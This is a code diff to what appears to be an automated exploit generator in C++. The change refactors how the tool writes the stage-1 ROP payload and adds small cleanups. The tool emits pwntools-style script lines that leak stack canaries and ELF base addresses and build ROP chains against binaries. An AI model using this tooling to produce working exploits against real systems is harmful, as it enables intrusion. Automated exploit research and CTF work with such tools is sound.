@@ -44,6 +44,8 @@ struct IOStateInfoVisitor {
     void operator()(const InputStateInfo &stateInfo);
     void operator()(const OutputStateInfo &stateInfo);
 
+    void handleStage1(const InputStateInfo &stateInfo);
+
     // Extra parameters
     Exploit &exploit;
     const ELF &elf;
@@ -60,7 +62,7 @@ void IOStateInfoVisitor::operator()(const InputStateInfo &stateInfo) {
         i >= modState.lastInputStateInfoIdxBeforeFirstSymbolicRip) {
         exploit.writeline(format("# input state (offset = %d), skipped", stateInfo.offset));
 
-        (void) inputStream.skip(stateInfo.offset);
+        static_cast<void>(inputStream.skip(stateInfo.offset));
         return;
     }
 
@@ -75,49 +77,53 @@ void IOStateInfoVisitor::operator()(const InputStateInfo &stateInfo) {
     }
 
     exploit.writeline("# input state (rop chain begin)");
-    for (size_t j = 0; j < ropChain.size(); j++) {
-        if (j == 0) {
-            if (elf.checksec.hasCanary || elf.checksec.hasPIE) {
-                std::string s = format("payload  = solve_stage1(canary, elf_base, '%s')",
-                                       modState.toString().c_str());
 
-                s += format("[%d:", inputStream.getNrBytesRead());
+    handleStage1(stateInfo);
 
-                if (!inputStream.getNrBytesSkipped()) {
-                    s += ']';
-                } else {
-                    s += format("%d]", inputStream.getNrBytesConsumed());
-                }
-
-                exploit.writeline(s);
-                exploit.flushRopPayload();
-
-            } else if (ropChain[0].size()) {
-                assert(ropChain[0].size() == 1);
-                llvm::ArrayRef<uint8_t> bytes = inputStream.read(stateInfo.offset);
-                std::string s = evaluate<std::string>(ByteVectorExpr::create(bytes));
-                exploit.appendRopPayload(s);
-                exploit.flushRopPayload();
-            }
-        } else {
-            for (const ref<Expr> &e : ropChain[j]) {
-                exploit.appendRopPayload(evaluate<std::string>(e));
-            }
-            exploit.flushRopPayload();
+    for (size_t j = 1; j < ropChain.size(); j++) {
+        for (const ref<Expr> &e : ropChain[j]) {
+            exploit.appendRopPayload(evaluate<std::string>(e));
         }
+        exploit.flushRopPayload();
     }
+}
+
+void IOStateInfoVisitor::handleStage1(const InputStateInfo &stateInfo) {
+    std::string s;
+
+    // Let's deal with the simplest case first (no canary and no PIE).
+    if (!elf.checksec.hasCanary && !elf.checksec.hasPIE) {
+        assert(ropChain[0].size() == 1 &&
+               "ropChain[0] must only contain a ByteVectorExpr");
+
+        llvm::ArrayRef<uint8_t> bytes = inputStream.read(stateInfo.offset);
+        s = evaluate<std::string>(ByteVectorExpr::create(bytes));
+    } else {
+        // If either canary or PIE is enabled, stage1 needs to be solved
+        // on the fly at exploitation time.
+        s  = format("payload  = solve_stage1(canary, elf_base, '%s')", modState.toString().c_str());
+        s += format("[%d:", inputStream.getNrBytesRead());
+
+        if (inputStream.getNrBytesSkipped()) {
+            s += std::to_string(inputStream.getNrBytesConsumed());
+        }
+        s += ']';
+    }
+
+    exploit.writeline(s);
+    exploit.flushRopPayload();
 }
 
 void IOStateInfoVisitor::operator()(const OutputStateInfo &stateInfo) {
     exploit.writeline("# output state");
 
+    // This output state cannot leak anything.
     if (!stateInfo.isInteresting) {
         exploit.writeline("proc.recvrepeat(0.1)");
         return;
     }
 
-    exploit.writeline(
-            format("# leaking: %s", IOStates::s_leakTypes[stateInfo.leakType].c_str()));
+    exploit.writeline("# leaking: " + IOStates::toString(stateInfo.leakType));
 
     if (stateInfo.leakType == IOStates::LeakType::CANARY) {
         exploit.writelines({
@@ -130,7 +136,7 @@ void IOStateInfoVisitor::operator()(const OutputStateInfo &stateInfo) {
             format("proc.recv(%d)", stateInfo.bufIndex),
             "elf_leak = u64(proc.recv(6).ljust(8, b'\\x00'))",
             format("elf_base = elf_leak - 0x%x", stateInfo.baseOffset),
-            "log.info('leaked elf_base : {}'.format(hex(elf_base)))",
+            "log.info('leaked elf_base: {}'.format(hex(elf_base)))",
         });
     }
 }
